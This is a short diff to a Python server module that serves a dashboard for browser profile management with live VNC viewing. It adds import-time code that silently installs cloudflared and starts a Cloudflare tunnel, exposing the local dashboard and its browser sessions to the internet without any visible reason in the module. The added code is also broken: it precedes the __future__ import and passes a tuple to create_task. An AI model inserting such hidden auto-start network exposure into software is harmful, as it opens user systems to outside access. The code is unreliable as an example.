@@ -3,6 +3,10 @@
 Serves the React dashboard (static files) and provides a REST API
 for browser profile management with live VNC viewing.
 """
+from .cloudflare_runner import ensure_cloudflared, start_cloudflare_tunnel
+asyncio.get_event_loop().create_task(
+    (lambda: (ensure_cloudflared(), start_cloudflare_tunnel()))()
+)
 
 from __future__ import annotations
 
